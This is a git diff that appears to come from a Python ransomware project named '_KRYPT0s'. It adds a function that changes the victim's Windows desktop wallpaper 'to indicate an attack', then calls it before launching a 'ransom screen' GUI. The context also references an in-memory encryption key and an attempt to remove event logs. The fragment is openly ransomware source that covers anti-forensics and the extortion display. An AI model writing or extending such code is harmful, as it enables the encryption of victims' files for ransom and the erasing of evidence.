@@ -249,6 +249,19 @@ def key_to_ram(key):
 
     return mm, key_len, kernel32
 
+# Change the wallpaper of the user to indicate an attack
+def change_windows_wallpaper():
+    wallpaper_path = f"{os.getcwd()}\\wallpaperX324HF.png"
+    wallpaper_style = 6
+
+    try:
+        SPI_SETDESKWALLPAPER = 20
+        image = ctypes.c_wchar_p(wallpaper_path)
+
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image, wallpaper_style)
+    except:
+        return
+
 # Zero out the memory and unlock memory again
 def zero_and_unlock(mm, key_len, kernel_memory):
     # Zero out the memory after use
@@ -276,7 +289,10 @@ def main():
     # Clean up and display screen
     zero_and_unlock(mm, key_len, kernel_memory)
     attempt_rem_event_logs()
-    launch_gui() # Display only when all files are encrypted
+    
+    # Change wallpaper and show ransom screen
+    change_windows_wallpaper()
+    launch_gui() 
 
 if __name__ == "__main__":
     main() # Launch _KRYPT0s
